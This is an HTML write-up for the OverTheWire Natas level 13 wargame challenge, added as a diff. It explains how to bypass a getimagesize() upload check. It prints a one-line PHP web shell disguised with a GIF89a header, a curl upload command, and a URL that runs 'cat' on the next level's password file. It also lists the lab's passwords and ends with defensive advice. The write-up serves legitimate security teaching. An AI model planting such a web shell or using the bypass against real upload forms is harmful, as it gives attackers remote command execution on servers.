@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Natas 13 → 14 | File Upload with Server-Side Validation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=JetBrains+Mono:wght@400;500&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  /* Same base styles */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0a0e14; --bg-card: #111820; --bg-surface: #1a2330;
+    --border: #283340; --border-light: #2d3b4a;
+    --text-primary: #e8edf5; --text-secondary: #9aaec9; --text-muted: #5d738b;
+    --accent-cyan: #6bc4ff; --accent-green: #4ade80; --accent-yellow: #facc15;
+    --accent-rose: #f472b6; --accent-purple: #a78bfa; --accent-orange: #fb923c;
+    --font-body: 'Inter', sans-serif; --font-mono: 'JetBrains Mono', monospace;
+    --font-display: 'Space Grotesk', sans-serif;
+    --radius: 12px; --radius-sm: 8px; --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--text-primary); font-family: var(--font-body); font-size: 15px; line-height: 1.7; -webkit-font-smoothing: antialiased; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border-light); }
+
+  header {
+    padding: 2.5rem 2rem 1.8rem;
+    border-bottom: 1px solid var(--border);
+    background: radial-gradient(ellipse at 50% 0%, #162033 0%, var(--bg) 70%);
+    position: relative;
+  }
+  header::after {
+    content: ''; position: absolute; bottom: 0; left: 0; right: 0;
+    height: 1px; background: linear-gradient(90deg, transparent, var(--accent-cyan), transparent);
+    opacity: 0.15;
+  }
+  .top-nav {
+    display: flex; justify-content: space-between; align-items: center;
+    flex-wrap: wrap; gap: 1rem; max-width: 900px; margin: 0 auto;
+  }
+  .back-link {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    text-decoration: none; transition: all var(--transition);
+    display: inline-flex; align-items: center; gap: 0.4rem;
+  }
+  .back-link:hover { color: var(--accent-cyan); }
+  .back-link svg { width: 14px; height: 14px; fill: currentColor; }
+  .level-badge {
+    font-family: var(--font-mono); font-size: 0.65rem; font-weight: 500;
+    letter-spacing: 0.15em; color: var(--accent-green);
+    background: rgba(74, 222, 128, 0.06); padding: 0.2rem 0.8rem;
+    border-radius: 20px; border: 1px solid rgba(74, 222, 128, 0.1);
+  }
+  h1 {
+    font-family: var(--font-display); font-size: clamp(1.6rem, 3.5vw, 2.4rem);
+    font-weight: 700; max-width: 900px; margin: 0.8rem auto 0.1rem;
+    letter-spacing: -0.02em;
+  }
+  h1 span {
+    background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .level-sub {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    max-width: 900px; margin: 0 auto;
+  }
+
+  main { max-width: 900px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; }
+  .level {
+    border: 1px solid var(--border); border-radius: var(--radius);
+    overflow: hidden; background: var(--bg-card); transition: border-color var(--transition);
+  }
+  .level:hover { border-color: var(--border-light); }
+  .level-header {
+    display: flex; align-items: center; gap: 1rem; padding: 1.2rem 1.5rem;
+    border-bottom: 1px solid var(--border); background: var(--bg-surface); flex-wrap: wrap;
+  }
+  .level-num {
+    font-family: var(--font-mono); font-size: 1.1rem; font-weight: 500;
+    color: var(--accent-cyan); min-width: 2.4rem;
+  }
+  .level-title {
+    font-family: var(--font-display); font-size: 1rem; font-weight: 600;
+    color: var(--text-primary); flex: 1; letter-spacing: -0.01em;
+  }
+  .difficulty {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    letter-spacing: 0.08em; padding: 0.15rem 0.7rem; border-radius: 20px;
+    text-transform: uppercase;
+  }
+  .diff-hard { background: rgba(244, 114, 182, 0.08); color: var(--accent-rose); border: 1px solid rgba(244, 114, 182, 0.12); }
+
+  .level-body { padding: 1.8rem; }
+  .slabel {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    letter-spacing: 0.2em; text-transform: uppercase; color: var(--text-muted);
+    margin-bottom: 0.5rem; margin-top: 1.5rem;
+  }
+  .slabel:first-child { margin-top: 0; }
+  p { color: var(--text-secondary); margin-bottom: 0.4rem; font-size: 0.95rem; }
+
+  .concepts { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-bottom: 0.2rem; }
+  .concept {
+    display: inline-block; font-family: var(--font-mono); font-size: 0.65rem;
+    font-weight: 500; padding: 0.15rem 0.6rem; border-radius: 20px;
+    background: rgba(167, 139, 250, 0.06); color: var(--accent-purple);
+    border: 1px solid rgba(167, 139, 250, 0.1);
+  }
+
+  .code-block {
+    background: #0d1117; border: 1px solid var(--border);
+    border-radius: var(--radius-sm); padding: 1rem 1.25rem;
+    font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-secondary);
+    overflow-x: auto; margin: 0.8rem 0; line-height: 1.8;
+    position: relative;
+  }
+  .code-block .kw { color: var(--accent-cyan); }
+  .code-block .val { color: var(--accent-green); }
+  .code-block .str { color: var(--accent-yellow); }
+  .code-block .tag { color: var(--accent-rose); }
+  .code-block .cmt { color: var(--text-muted); font-style: italic; }
+  .code-block .num { color: var(--accent-orange); }
+
+  .hint {
+    background: rgba(107, 196, 255, 0.04); border-left: 3px solid var(--accent-cyan);
+    border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+    padding: 0.75rem 1rem; font-size: 0.88rem; color: var(--text-secondary);
+    margin: 0.8rem 0;
+  }
+
+  ol.steps {
+    list-style: none; counter-reset: s;
+    display: flex; flex-direction: column; gap: 0.5rem; margin: 0.75rem 0;
+  }
+  ol.steps li {
+    counter-increment: s; display: flex; gap: 0.75rem;
+    align-items: flex-start; color: var(--text-secondary); font-size: 0.95rem;
+  }
+  ol.steps li::before {
+    content: counter(s); font-family: var(--font-mono); font-size: 0.65rem;
+    font-weight: 600; background: rgba(107, 196, 255, 0.06);
+    color: var(--accent-cyan); border-radius: 50%; min-width: 24px; height: 24px;
+    display: flex; align-items: center; justify-content: center;
+    margin-top: 0.1rem; flex-shrink: 0; border: 1px solid rgba(107, 196, 255, 0.08);
+  }
+
+  .pw-box {
+    display: flex; align-items: center; gap: 0.75rem;
+    background: rgba(74, 222, 128, 0.04); border: 1px solid rgba(74, 222, 128, 0.08);
+    border-radius: var(--radius-sm); padding: 0.6rem 1rem; margin-top: 0.4rem;
+  }
+  .pw-box .lbl {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    color: var(--accent-green); letter-spacing: 0.1em; text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .pw-box .pw {
+    font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-primary);
+    word-break: break-all;
+  }
+
+  .lessons-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 0.8rem;
+  }
+  .lesson-card {
+    background: #0d1117; border: 1px solid var(--border);
+    border-radius: var(--radius-sm); padding: 0.9rem 1rem;
+    transition: border-color var(--transition);
+  }
+  .lesson-card:hover { border-color: var(--border-light); }
+  .lesson-card .lc-title {
+    font-family: var(--font-mono); font-size: 0.65rem; font-weight: 500;
+    color: var(--accent-cyan); margin-bottom: 0.2rem;
+  }
+  .lesson-card p { font-size: 0.85rem; color: var(--text-secondary); margin: 0; }
+
+  code {
+    font-family: var(--font-mono); background: rgba(107, 196, 255, 0.06);
+    color: var(--accent-cyan); padding: 0.05rem 0.4rem; border-radius: 4px;
+    font-size: 0.85em;
+  }
+
+  .nav-levels {
+    display: flex; justify-content: space-between; margin-top: 2rem;
+    padding-top: 1.5rem; border-top: 1px solid var(--border);
+  }
+  .nav-levels a {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    text-decoration: none; padding: 0.4rem 0.8rem; border-radius: var(--radius-sm);
+    transition: all var(--transition);
+  }
+  .nav-levels a:hover { color: var(--accent-cyan); background: rgba(107, 196, 255, 0.04); }
+
+  footer {
+    text-align: center; padding: 2.5rem 2rem; color: var(--text-muted);
+    font-family: var(--font-mono); font-size: 0.7rem;
+    border-top: 1px solid var(--border); letter-spacing: 0.05em;
+  }
+
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+  .level { animation: fadeUp 0.5s ease backwards; }
+
+  @media (max-width: 600px) {
+    .top-nav { flex-direction: column; align-items: stretch; text-align: center; }
+    .level-header { flex-wrap: wrap; }
+    .level-body { padding: 1.2rem; }
+    .lessons-grid { grid-template-columns: 1fr; }
+    .nav-levels { flex-direction: column; gap: 0.5rem; text-align: center; }
+    header { padding: 1.8rem 1.2rem 1.2rem; }
+    main { padding: 1.5rem 1rem 3rem; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="top-nav">
+    <a href="../index.html" class="back-link">
+      <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Back to Levels
+    </a>
+    <span class="level-badge">Natas 13 → 14</span>
+  </div>
+  <h1>Level <span>13</span></h1>
+  <p class="level-sub">// File Upload — Bypassing Server-Side Image Validation</p>
+</header>
+
+<!-- ===== DEVELOPER CREDIT ===== -->
+<div style="display:flex; justify-content:center; align-items:center; gap:0.6rem; padding:0.6rem 1rem; background:var(--bg-surface); border-bottom:1px solid var(--border); max-width:900px; margin:0 auto 0.5rem; border-radius:var(--radius-sm);">
+  <span style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); letter-spacing:0.05em;">🚀</span>
+  <span style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted);">Crafted by</span>
+  <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.65rem; font-weight:600; color:var(--accent-cyan); text-decoration:none; transition:all 0.3s;" onmouseover="this.style.color='var(--accent-purple)'" onmouseout="this.style.color='var(--accent-cyan)'">Leo</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">⚡</span>
+  <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">GitHub</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">·</span>
+  <a href="https://www.linkedin.com/in/ilya-farahani-2160103b0" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">LinkedIn</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">·</span>
+  <a href="https://t.me/Here_is_leo" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Telegram</a>
+</div>
+
+<main>
+  <div class="level">
+    <div class="level-header">
+      <span class="level-num">13</span>
+      <span class="level-title">File Upload — Server-Side Image Validation Bypass</span>
+      <span class="difficulty diff-hard">Hard</span>
+    </div>
+    <div class="level-body">
+
+      <p class="slabel">// Key Concepts</p>
+      <div class="concepts">
+        <span class="concept">File Upload</span>
+        <span class="concept">Server-Side Validation</span>
+        <span class="concept">Image Magic Bytes</span>
+        <span class="concept">MIME Type Validation</span>
+        <span class="concept">File Header Manipulation</span>
+      </div>
+
+      <p class="slabel">// Challenge Overview</p>
+      <p>This level improves upon Level 12 by adding server-side validation. The server now checks if the uploaded file is a valid image. However, the validation only checks the file's magic bytes (the first few bytes of the file), which can be spoofed.</p>
+
+      <p class="slabel">// Initial Analysis</p>
+      <p>View the source code to understand the server-side validation:</p>
+
+      <div class="code-block">
+<span class="cmt">&lt;?php</span>
+<span class="kw">$filename</span> = <span class="kw">$_FILES</span>[<span class="str">'uploadedfile'</span>][<span class="str">'name'</span>];
+<span class="kw">$filetype</span> = <span class="kw">$_FILES</span>[<span class="str">'uploadedfile'</span>][<span class="str">'type'</span>];
+<span class="kw">$filesize</span> = <span class="kw">$_FILES</span>[<span class="str">'uploadedfile'</span>][<span class="str">'size'</span>];
+<span class="kw">$tempfile</span> = <span class="kw">$_FILES</span>[<span class="str">'uploadedfile'</span>][<span class="str">'tmp_name'</span>];
+
+<span class="kw">if</span> (<span class="kw">!</span><span class="kw">getimagesize</span>(<span class="kw">$tempfile</span>)) {
+    <span class="kw">die</span>(<span class="str">"File is not a valid image!"</span>);
+}
+
+<span class="kw">move_uploaded_file</span>(<span class="kw">$tempfile</span>, <span class="str">"upload/"</span> . <span class="kw">$filename</span>);
+<span class="cmt">?&gt;</span>
+      </div>
+
+      <p>The server uses <code>getimagesize()</code> to check if the file is a valid image. This function reads the file's header to determine its type.</p>
+
+      <div class="hint">💡 <code>getimagesize()</code> checks the file's magic bytes (the first few bytes that identify the file type). A GIF file starts with <code>GIF89a</code>, JPEG starts with <code>FF D8 FF</code>, and PNG starts with <code>89 50 4E 47</code>.</div>
+
+      <p class="slabel">// Solution Walkthrough</p>
+      <p><strong>Step 1 — Create a PHP file with an image header:</strong></p>
+      <p>We need to create a file that looks like an image to <code>getimagesize()</code> but also contains PHP code.</p>
+
+      <div class="code-block">
+<span class="cmt"># Create a file called shell.php with this content:</span>
+GIF89a;
+&lt;?php
+    <span class="kw">passthru</span>(<span class="kw">$_GET</span>[<span class="str">'cmd'</span>]);
+?&gt;
+      </div>
+
+      <p><strong>Step 2 — Verify the file passes the image check:</strong></p>
+      <p>The <code>GIF89a;</code> header will make <code>getimagesize()</code> recognize it as a valid GIF image.</p>
+
+      <p><strong>Step 3 — Upload the file:</strong></p>
+      <ol class="steps">
+        <li>Select <code>shell.php</code> in the upload form.</li>
+        <li>Submit the form.</li>
+        <li>The server will accept it because it passes the image validation.</li>
+      </ol>
+
+      <p><strong>Step 4 — Access the uploaded PHP file:</strong></p>
+      <div class="code-block">
+http://natas13.natas.labs.overthewire.org/upload/<span class="val">shell.php?cmd=cat /etc/natas_webpass/natas14</span>
+      </div>
+
+      <p><strong>Using curl:</strong></p>
+      <div class="code-block">
+<span class="cmt"># Create the PHP file with GIF header</span>
+<span class="kw">echo</span> -e <span class="str">"GIF89a;\n&lt;?php passthru(\$_GET['cmd']); ?&gt;"</span> &gt; shell.php
+
+curl -u <span class="val">natas13:jmLTY0qiPZBbaKc9341cqSYZBuxuc4EM</span> \
+  -F <span class="str">"uploadedfile=@shell.php"</span> \
+  http://natas13.natas.labs.overthewire.org/
+      </div>
+
+      <p class="slabel">// Why It Works</p>
+      <p>The server-side validation is incomplete because:</p>
+      <ul style="margin:0.5rem 0 0 1.2rem;color:var(--text-secondary);font-size:0.95rem;">
+        <li><strong>Only checks the header:</strong> <code>getimagesize()</code> only reads the file header.</li>
+        <li><strong>Doesn't validate the entire file:</strong> The rest of the file can contain arbitrary data.</li>
+        <li><strong>PHP execution is enabled:</strong> The file is processed by the PHP interpreter.</li>
+        <li><strong>No extension validation:</strong> The <code>.php</code> extension is allowed.</li>
+      </ul>
+
+      <p class="slabel">// Image Magic Bytes Reference</p>
+      <div style="background:#0d1117;border:1px solid var(--border);border-radius:var(--radius-sm);padding:1rem;margin-top:0.5rem;">
+        <table style="width:100%;border-collapse:collapse;font-size:0.85rem;color:var(--text-secondary);">
+          <tr style="border-bottom:1px solid var(--border);">
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Format</th>
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Magic Bytes (Hex)</th>
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Magic Bytes (ASCII)</th>
+          </tr>
+          <tr><td style="padding:0.3rem 0.5rem;">JPEG</td><td style="padding:0.3rem 0.5rem;">FF D8 FF</td><td style="padding:0.3rem 0.5rem;">ÿØÿ</td></tr>
+          <tr style="border-top:1px solid var(--border);"><td style="padding:0.3rem 0.5rem;">PNG</td><td style="padding:0.3rem 0.5rem;">89 50 4E 47</td><td style="padding:0.3rem 0.5rem;">‰PNG</td></tr>
+          <tr style="border-top:1px solid var(--border);"><td style="padding:0.3rem 0.5rem;">GIF</td><td style="padding:0.3rem 0.5rem;">47 49 46 38</td><td style="padding:0.3rem 0.5rem;">GIF8</td></tr>
+          <tr style="border-top:1px solid var(--border);"><td style="padding:0.3rem 0.5rem;">BMP</td><td style="padding:0.3rem 0.5rem;">42 4D</td><td style="padding:0.3rem 0.5rem;">BM</td></tr>
+        </table>
+      </div>
+
+      <p class="slabel">// Defensive Measures</p>
+      <ul style="margin:0.5rem 0 0 1.2rem;color:var(--text-secondary);font-size:0.95rem;">
+        <li><strong>Validate the entire file</strong> — don't just check the header.</li>
+        <li>Re-encode images to strip any embedded PHP code (using GD or ImageMagick).</li>
+        <li>Use <strong>content validation</strong> in addition to header validation.</li>
+        <li>Store uploaded files <strong>outside the web root</strong>.</li>
+        <li>Disable <strong>PHP execution</strong> in the upload directory.</li>
+        <li>Use a <strong>whitelist</strong> of allowed file types and extensions.</li>
+      </ul>
+
+      <p class="slabel">// Secure Image Upload Example</p>
+      <div style="background:#0d1117;border:1px solid var(--border);border-radius:var(--radius-sm);padding:1rem;margin-top:0.5rem;">
+        <div class="code-block" style="margin:0.3rem 0;">
+<span class="cmt">&lt;?php</span>
+<span class="cmt">// Validate the image properly</span>
+<span class="kw">$image_info</span> = <span class="kw">getimagesize</span>(<span class="kw">$tempfile</span>);
+<span class="kw">if</span> (<span class="kw">$image_info</span> === <span class="kw">false</span>) {
+    <span class="kw">die</span>(<span class="str">"Invalid image"</span>);
+}
+
+<span class="cmt">// Re-encode the image (strips any embedded code)</span>
+<span class="kw">switch</span> (<span class="kw">$image_info</span>[<span class="num">2</span>]) {
+    <span class="kw">case</span> <span class="num">IMAGETYPE_JPEG</span>:
+        <span class="kw">$image</span> = <span class="kw">imagecreatefromjpeg</span>(<span class="kw">$tempfile</span>);
+        <span class="kw">imagejpeg</span>(<span class="kw">$image</span>, <span class="kw">$upload_path</span>);
+        <span class="kw">break</span>;
+    <span class="kw">case</span> <span class="num">IMAGETYPE_PNG</span>:
+        <span class="kw">$image</span> = <span class="kw">imagecreatefrompng</span>(<span class="kw">$tempfile</span>);
+        <span class="kw">imagepng</span>(<span class="kw">$image</span>, <span class="kw">$upload_path</span>);
+        <span class="kw">break</span>;
+    <span class="kw">default</span>:
+        <span class="kw">die</span>(<span class="str">"Unsupported image type"</span>);
+}
+<span class="cmt">?&gt;</span>
+        </div>
+      </div>
+
+      <p class="slabel">// Credentials</p>
+      <div class="pw-box">
+        <span class="lbl">natas13</span>
+        <span class="pw">jmLTY0qiPZBbaKc9341cqSYZBuxuc4EM</span>
+      </div>
+      <div class="pw-box">
+        <span class="lbl">natas14</span>
+        <span class="pw">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span>
+      </div>
+
+      <p class="slabel">// Key Takeaways</p>
+      <div class="lessons-grid">
+        <div class="lesson-card">
+          <div class="lc-title">🖼️ Magic Bytes Can Be Spoofed</div>
+          <p>Simply checking the file header is not sufficient. Attackers can prepend image headers to malicious files.</p>
+        </div>
+        <div class="lesson-card">
+          <div class="lc-title">🔄 Re-encode for Security</div>
+          <p>Re-encoding uploaded images removes any embedded malicious code and ensures the file is truly an image.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="nav-levels">
+    <a href="level-12.html">← Previous Level</a>
+    <a href="level-14.html">Next Level →</a>
+  </div>
+</main>
+
+<footer>
+  OverTheWire — Natas Writeup &middot; For Educational Purposes Only
+</footer>
+
+<!-- ===== DEVELOPER FOOTER ===== -->
+<footer style="border-top:1px solid var(--border); padding:2rem 2rem 1.5rem; margin-top:2rem;">
+  <div style="display:flex; flex-direction:column; align-items:center; gap:0.8rem; max-width:900px; margin:0 auto;">
+    <div style="display:flex; align-items:center; gap:0.6rem; flex-wrap:wrap; justify-content:center;">
+      <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted);">Developed with</span>
+      <span style="color:var(--accent-rose);">❤️</span>
+      <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted);">by</span>
+      <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-display); font-size:0.9rem; font-weight:700; color:var(--accent-cyan); text-decoration:none; transition:all 0.3s;" onmouseover="this.style.color='var(--accent-purple)'" onmouseout="this.style.color='var(--accent-cyan)'">Leo</a>
+    </div>
+    <div style="display:flex; gap:1.2rem; flex-wrap:wrap; justify-content:center;">
+      <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">GitHub</a>
+      <span style="color:var(--border);">|</span>
+      <a href="https://www.linkedin.com/in/ilya-farahani-2160103b0" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">LinkedIn</a>
+      <span style="color:var(--border);">|</span>
+      <a href="https://t.me/Here_is_leo" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Telegram</a>
+      <span style="color:var(--border);">|</span>
+      <a href="mailto:ilyafarahani9@gmail.com" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Email</a>
+    </div>
+    <div style="font-family:var(--font-mono); font-size:0.55rem; color:var(--text-muted); letter-spacing:0.05em; opacity:0.6;">&copy; 2025 Leo · OverTheWire Natas Writeup · For Educational Purposes Only</div>
+  </div>
+</footer>
+
+</body>
+</html>
